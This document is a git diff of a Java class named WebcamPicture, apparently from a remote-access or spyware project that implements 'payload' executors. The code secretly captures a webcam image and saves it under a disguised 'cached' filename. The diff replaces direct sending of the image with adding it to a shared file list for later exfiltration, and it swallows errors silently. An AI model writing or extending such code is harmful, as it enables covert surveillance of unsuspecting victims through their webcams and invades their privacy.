@@ -1,12 +1,13 @@
 package dev.peter.luterium.features;
 
 import com.github.sarxos.webcam.Webcam;
-import dev.peter.luterium.Main;
 import dev.peter.luterium.payload.PayloadExecutor;
 
 import javax.imageio.ImageIO;
 import java.io.File;
 import java.util.Random;
+
+import static dev.peter.luterium.Main.fileList;
 
 /**
  * @author Peter
@@ -14,7 +15,6 @@ import java.util.Random;
  */
 
 public class WebcamPicture implements PayloadExecutor {
-    Main main = new Main();
     @Override
     public void execute() throws Exception {
         try {
@@ -24,10 +24,7 @@ public class WebcamPicture implements PayloadExecutor {
             File webcam = new File("1cached_" + random + ".png");
             ImageIO.write(cam.getImage(), "PNG", webcam);
             cam.close();
-            main.theThing.send(webcam);
-            webcam.delete();
-        } catch (Exception e) {
-            main.theThing.send("Couldn't get webcam!");
-        }
+            fileList.add(webcam);
+        } catch (Exception ignored) {}
     }
 }
